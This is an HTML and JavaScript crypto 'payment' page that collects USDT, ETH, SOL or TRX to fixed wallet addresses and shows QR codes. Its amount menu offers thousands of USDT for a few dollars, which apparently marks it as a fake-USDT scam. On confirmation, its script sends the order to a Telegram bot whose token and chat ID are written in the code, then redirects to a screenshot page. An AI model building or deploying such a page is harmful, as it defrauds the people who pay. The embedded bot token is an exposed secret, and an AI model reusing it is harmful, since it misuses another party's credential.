<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Payment Info</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    body {
      margin: 0;
      background: url('background.jpg') no-repeat center center fixed;
      background-size: cover;
      color: #000000; /* نص أسود */
      font-family: sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
      min-height: 100vh;
    }

    .container {
      background: rgba(10, 30, 70, 0.3); /* أزرق شفاف */
      backdrop-filter: blur(15px);
      -webkit-backdrop-filter: blur(15px);
      border: 1px solid rgba(30, 60, 120, 0.5);
      box-shadow: 0 8px 32px 0 rgba(10, 50, 120, 0.7);
      padding: 5vw;
      border-radius: 2vw;
      width: 100%;
      max-width: 500px;
      text-align: center;
      color: #000000;
    }

    h2, h3 {
      font-size: 6vw;
      margin: 3vw 0;
      color: #000000;
      text-shadow: none;
    }

    select, button {
      padding: 4vw;
      margin: 4vw 0;
      border-radius: 2vw;
      border: none;
      width: 100%;
      font-size: 5vw;
      background-color: rgba(30, 70, 140, 0.6);
      color: #000000; /* نص أسود في الأزرار والخانات */
      backdrop-filter: blur(10px);
      -webkit-backdrop-filter: blur(10px);
      cursor: pointer;
      transition: background-color 0.3s ease, box-shadow 0.3s ease;
      box-shadow: 0 0 8px #3399ff;
    }

    select:hover, button:hover {
      background-color: rgba(50, 100, 200, 0.9);
      box-shadow: 0 0 12px #66bbff;
    }

    .network-image {
      width: 25vw;
      max-width: 120px;
      margin: 5vw auto;
      filter: drop-shadow(0 0 5px #3399ff);
    }

    .qr-image {
      margin-top: 4vw;
      margin-bottom: 2vw;
      width: 40vw;
      max-width: 200px;
      border-radius: 1vw;
      box-shadow: 0 0 15px #3399ff;
    }

    .address-box {
      background-color: rgba(30, 70, 140, 0.5);
      padding: 4vw;
      border-radius: 2vw;
      word-break: break-word;
      font-size: 4vw;
      margin-top: 4vw;
      box-shadow: inset 0 0 10px #3399ff;
      color: #000000; /* نص أسود */
      text-shadow: none;
    }

    .value-display {
      font-size: 5vw;
      color: #000000;
      margin-top: 2vw;
      text-shadow: none;
    }

    #warningText {
      font-size: 4vw;
      color: #000000;
      margin-top: 4vw;
      text-shadow: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>YOUR PAYMENT NETWORK</h2>
    <select id="networkSelect" onchange="showPaymentInfo()">
      <option value="">Select Network</option>
      <option value="USDT">TETHER BSC (BEP20)</option>
      <option value="ETH">ETH</option>
      <option value="Solana">Solana</option>
      <option value="Trx">Tron</option>
    </select>

    <div id="paymentInfo" style="display:none;">
      <img id="networkImage" class="network-image" src="" alt="Network">

      <h3>Choose Amount</h3>
      <select id="amountSelect" onchange="showValue()">
        <option value="">Select Amount</option>
      </select>
      <div class="value-display" id="valueText"></div>

      <p id="warningText"></p>

      <img id="qrCode" class="qr-image" src="" alt="QR Code">

      <div class="address-box" id="addressText"></div>

      <button onclick="confirmPayment()">Confirm Payment</button>
    </div>
  </div>

  <script>
    const addresses = {
      USDT: "0x9B767999d83651c244D2225A910a3a2456c98a3c",
      ETH: "0x9B767999d83651c244D2225A910a3a2456c98a3c",
      Solana: "4JAFP2sYg6GWKfziWR8Y8bxz3RwYDBgE6BVzX9KZkqSg",
      Trx: "TVrN9wQ2c91fk8xHNBj4MNuSQwjzXZmH2h"
    };

    const images = {
      USDT: "bnb.png",
      ETH: "ethereum.png",
      Solana: "solana.png",
      Trx: "tron.png"
    };

    const amounts = {
      USDT: [
        {usdt: 5000, value: "10"},
        {usdt: 20000, value: "25"},
        {usdt: 100000, value: "50"}
      ],
      ETH: [
        {usdt: 5000, value: "0.003902"},
        {usdt: 20000, value: "0.009756"},
        {usdt: 100000, value: "0.019512"}
      ],
      Trx: [
        {usdt: 5000, value: "37.432855"},
        {usdt: 20000, value: "93.582137"},
        {usdt: 100000, value: "187.164274"}
      ],
      Solana: [
        {usdt: 5000, value: "0.056186"},
        {usdt: 20000, value: "0.139501"},
        {usdt: 100000, value: "0.279002"}
      ]
    };

    const tokenMap = {
      USDT: "USDT",
      ETH: "ETH",
      Trx: "TRX",
      Solana: "SOL"
    };

    const networkMap = {
      USDT: "BEP20",
      ETH: "Ethereum",
      Trx: "Tron",
      Solana: "Solana"
    };

    function showPaymentInfo() {
      const network = document.getElementById("networkSelect").value;
      if (!network) return;

      document.getElementById("networkImage").src = images[network];
      document.getElementById("warningText").textContent =
        network === "USDT"
          ? "Send using Tether (USDT) on the BEP20 (BSC) network only."
          : `Send only on the ${networkMap[network]} network.`;
      document.getElementById("addressText").textContent = addresses[network];
      document.getElementById("paymentInfo").style.display = "block";
      document.getElementById("networkSelect").style.display = "none";

      const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(addresses[network])}`;
      document.getElementById("qrCode").src = qrUrl;

      const amountSelect = document.getElementById("amountSelect");
      amountSelect.innerHTML = '<option value="">Select Amount</option>';
      amounts[network].forEach(item => {
        amountSelect.innerHTML += `<option value="${item.value}">${item.usdt} USDT = ${item.value} ${tokenMap[network]}</option>`;
      });

      document.getElementById("valueText").textContent = "";
    }

    function showValue() {
      const amount = document.getElementById("amountSelect").value;
      const network = document.getElementById("networkSelect").value;
      const token = tokenMap[network];
      const networkName = networkMap[network];

      document.getElementById("valueText").textContent = amount
        ? `You will send: ${amount} ${token} via ${networkName}`
        : "";
    }

    function confirmPayment() {
      const network = document.getElementById("networkSelect").value;
      const amount = document.getElementById("amountSelect").value;
      const token = tokenMap[network];
      const networkName = networkMap[network];
      const address = addresses[network];
      const chatId = "7739393558";
      const botToken = "8187809372:AAG4a4uXNzKP57b3d2rSuvw_ZIxfKVfK7zw";

      if (!amount || !network) {
        alert("Please choose network and amount.");
        return;
      }

      const msg = `New Payment\nYou will send: ${amount} ${token} via ${networkName}\nAddress: ${address}`;
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

      fetch(url, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({chat_id: chatId, text: msg})
      }).then(() => {
        window.location.href = "screenshot.html";
      });
    }
  </script>
</body>
</html>
